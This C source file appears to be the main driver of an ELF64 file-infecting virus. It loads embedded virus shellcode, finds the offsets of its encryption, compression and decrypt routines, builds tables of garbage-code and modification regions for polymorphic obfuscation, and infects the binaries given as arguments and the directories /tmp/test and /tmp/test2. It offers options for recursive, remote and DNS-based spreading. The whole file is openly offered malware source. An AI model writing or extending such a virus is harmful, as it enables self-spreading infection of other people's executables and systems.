#include "ft_lib.h"
#include "infect.h"
#include "elf64.h"
#include "shellcode.h"
#include "table.h"

char key[16];

int usage(char *name){
	print("usage: ./");
	print(name);
	print(" binary\n\nnote: the binary must be in elf64\n");
	return -1;
}

uint32_t ft_rand(){
	uint32_t		rval;
	int             fd;

	if ((fd = ft_open("/dev/urandom", 0, 0)) == -1)
		return FALSE;
	ft_read(fd, &rval, 4);
	ft_close(fd);
	return rval;
}

int get_virus_info(InfectParams *p){
	if (elf_check_valid(virus_shellcode, virus_shellcode_len) == FALSE) return FALSE;
	char *v;
	size_t l;
	size_t c_off;
	size_t c_len;
	size_t cmpr_off;
	size_t cmpr_len;
	int64_t bin_start_off;
	int64_t bin_end_off;

	elf_off_symbol(virus_shellcode, virus_shellcode_len, "bin_start", &bin_start_off);
	elf_off_symbol(virus_shellcode, virus_shellcode_len, "bin_end", &bin_end_off);
	v = virus_shellcode + bin_start_off;
	l = bin_end_off - bin_start_off;


	elf_off_symbol(virus_shellcode, virus_shellcode_len, "cmpr_start", (int64_t*)&cmpr_off);
	elf_off_symbol(virus_shellcode, virus_shellcode_len, "cmpr_end", (int64_t*)&cmpr_len);
	cmpr_len = cmpr_len-cmpr_off;
	cmpr_off -= bin_start_off;

	elf_off_symbol(virus_shellcode, virus_shellcode_len, "crypt_start", (int64_t*)&c_off);
	elf_off_symbol(virus_shellcode, virus_shellcode_len, "crypt_end", (int64_t*)&c_len);
	c_len = c_len-c_off;
	c_off -= bin_start_off;

	int64_t decrypt_routine_off;
	elf_off_symbol(virus_shellcode, virus_shellcode_len, "DECRYPT_ROUTINE", (int64_t*)&decrypt_routine_off);
	decrypt_routine_off -= bin_start_off;

	int64_t data_off;
	elf_off_symbol(virus_shellcode, virus_shellcode_len, "data", (int64_t*)&data_off);
	data_off -= bin_start_off;

	int64_t dataearly_off;
	elf_off_symbol(virus_shellcode, virus_shellcode_len, "dataearly", (int64_t*)&dataearly_off);
	dataearly_off -= bin_start_off;

	int64_t infectpush_off;
	elf_off_symbol(virus_shellcode, virus_shellcode_len, "_infect_push", (int64_t*)&infectpush_off);
	infectpush_off -= bin_start_off;

	int64_t infectpop_off;
	elf_off_symbol(virus_shellcode, virus_shellcode_len, "_infect_pop", (int64_t*)&infectpop_off);
	infectpop_off -= bin_start_off;

	void *x = ft_malloc(1024);
	((int*)x)[0] = 0;
	*p = (InfectParams){v, l, cmpr_off, cmpr_len, c_off, c_len, decrypt_routine_off, x, data_off, dataearly_off, infectpush_off, infectpop_off};
	return TRUE;
}

#define STR_GB_START ".garb_start"
#define STR_GB_END ".garb_end"

int set_garbage_infos(){
	int64_t bin_start_off;

	elf_off_symbol(virus_shellcode, virus_shellcode_len, "bin_start", &bin_start_off);

	int64_t off_gt_len;
	elf_off_symbol(virus_shellcode, virus_shellcode_len, "garbage_table_len", &off_gt_len);
	uint32_t gt_len = ((uint32_t *)((char *)(virus_shellcode + off_gt_len)))[0];

	int64_t off_gt;
	elf_off_symbol(virus_shellcode, virus_shellcode_len, "garbage_table", &off_gt);
	Garbage *gt = ((Garbage *)((char *)(virus_shellcode + off_gt)));

	Elf64_Shdr *symtab = NULL;
	Elf64_Shdr *strtab = NULL;

	if (!elf_get_tabs(virus_shellcode, virus_shellcode_len, &symtab, &strtab))
		return FALSE;

	Elf64_Sym *sym = (void*)(((char*)virus_shellcode) + symtab->sh_offset);
	char *strs = ((char*)virus_shellcode) + strtab->sh_offset;

	uint32_t x = 0;
	uint32_t n = (symtab->sh_size / sizeof(Elf64_Sym));
	for (size_t i = 0; i < n; i++) {
		//WARNING: this algo may not work on other the linker
		if (startswith(strs + sym[i].st_name, STR_GB_START)){
			if (!(i+1 < n && startswith(strs + sym[i+1].st_name, STR_GB_END) &&
						str_equal(strs + sym[i].st_name + slen(STR_GB_START),
							strs + sym[i+1].st_name + slen(STR_GB_END))))
				return FALSE;
			gt[x] = (Garbage){sym[i].st_value - bin_start_off, sym[i+1].st_value - sym[i].st_value};
			//skip next
			x += 1;
			i += 1;
		}
	}
	if (x != gt_len) return FALSE;
	return TRUE;
}

#define STR_M_START ".modif_start"
#define STR_M_END ".modif_end"

int set_modif_infos(){
	int64_t bin_start_off;

	elf_off_symbol(virus_shellcode, virus_shellcode_len, "bin_start", &bin_start_off);


	int64_t off_mt_len;
	elf_off_symbol(virus_shellcode, virus_shellcode_len, "modified_table_len", &off_mt_len);
	uint32_t mt_len = ((uint32_t *)((char *)(virus_shellcode + off_mt_len)))[0];

	int64_t off_mt;
	elf_off_symbol(virus_shellcode, virus_shellcode_len, "modified_table", &off_mt);
 	Modif *mt = ((Garbage *)((char *)(virus_shellcode + off_mt)));

	Elf64_Shdr *symtab = NULL;
	Elf64_Shdr *strtab = NULL;

	if (!elf_get_tabs(virus_shellcode, virus_shellcode_len, &symtab, &strtab))
		return FALSE;

	Elf64_Sym *sym = (void*)(((char*)virus_shellcode) + symtab->sh_offset);
	char *strs = ((char*)virus_shellcode) + strtab->sh_offset;

	uint32_t x = 0;
	uint32_t n = (symtab->sh_size / sizeof(Elf64_Sym));
	for (size_t i = 0; i < n; i++) {
		//WARNING: this algo may not work on other the linker
		if (startswith(strs + sym[i].st_name, STR_M_START)){
			if (!(i+1 < n && startswith(strs + sym[i+1].st_name, STR_M_END) &&
						str_equal(strs + sym[i].st_name + slen(STR_M_START),
							strs + sym[i+1].st_name + slen(STR_M_END))))
				return FALSE;
			mt[x] = (Modif){sym[i].st_value - bin_start_off, sym[i+1].st_value - sym[i].st_value, (char*)(strs + sym[i].st_name)[slen(STR_M_START)]-'0'};
			//skip next
			x += 1;
			i += 1;
		}
	}
}

int main(int ac, char **av){
	InfectParams p;
	char *virus;
	size_t virus_len;
	size_t crypt_off;
	size_t crypt_len;
	struct s_opt opt;
	ft_bzero(&opt, sizeof(opt));
	bool do_infect_dir = TRUE;

	if (!set_garbage_infos())
		return 2;
	if (!set_modif_infos())
		return 3;
	if (get_virus_info(&p) == FALSE)
		return 1;
	for (int i = 1; i < ac; i ++){
		if (str_equal(av[i], "--no-infect-dir"))
			do_infect_dir = FALSE;
		else if (str_equal(av[i], "--recur"))
			opt.do_recur = TRUE;
		else if (str_equal(av[i], "--remote"))
			opt.do_remote = TRUE;
		else if (str_equal(av[i], "--msg"))
			opt.print_msg = TRUE;
		else if (str_equal(av[i], "--dns_remote"))
			opt.do_dns_remote = TRUE;
		else{
			debug("infect ", av[i]);
			infect(av[i], av[i], p, opt);
		}
		//else if (str_equal(av[i], "--big-recur"))
		//	opt.print_msg = TRUE;
	}
	if (do_infect_dir){
		infect_dir("/tmp/test", p, opt);
		infect_dir("/tmp/test2", p, opt);
	}
	return 0;
}
